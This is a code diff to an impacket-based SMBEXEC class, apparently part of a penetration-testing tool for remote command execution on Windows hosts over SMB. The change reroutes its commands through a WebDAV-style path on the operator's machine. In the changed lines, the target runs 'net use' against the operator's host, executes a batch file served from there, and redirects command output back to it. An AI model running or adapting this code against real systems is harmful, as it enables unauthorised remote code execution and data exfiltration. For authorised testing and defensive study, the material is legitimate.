@@ -13,7 +13,7 @@ from impacket.smbconnection import *
 
 class SMBEXEC:
 
-    def __init__(self, host, share_name, protocol, username = '', password = '', domain = '', hashes = None, share = None, port=445):
+    def __init__(self, host, share_name, protocol, username = '', password = '', domain = '', hashes = None, share = None, port=445, webPort="80"):
         self.__host = host
         self.__share_name = share_name
         self.__port = port
@@ -32,6 +32,7 @@ class SMBEXEC:
         self.__rpctransport = None
         self.__scmr = None
         self.__conn = None
+        self.__webPort = webPort
 
         if hashes is not None:
             if hashes.find(':') != -1:
@@ -77,7 +78,7 @@ class SMBEXEC:
 
         data = data.replace('&', '^&')
         if self.__retOutput:
-            command = self.__shell + data + ' ^> \\\\{}\\tmp\\{}'.format(local_ip, self.__output)
+            command = self.__shell + data + ' ^> \\\\{}@{}\\misc\\tmp\\{}'.format(local_ip, self.__webPort, self.__output)
         else:
             command = self.__shell + data
         
@@ -86,7 +87,7 @@ class SMBEXEC:
 
         logging.debug('Hosting batch file with command: ' + command)
 
-        command = self.__shell + 'net use \\\\{}\\tmp\\ && \\\\{}\\tmp\\{}'.format(local_ip, local_ip, self.__batchFile)
+        command = self.__shell + 'net use \\\\{}@{}\\misc\\tmp\\ && \\\\{}@{}\\misc\\tmp\\{}'.format(local_ip, self.__webPort, local_ip, self.__webPort, self.__batchFile)
         logging.debug('Command to execute: ' + command)
 
         logging.debug('Remote service {} created.'.format(self.__serviceName))
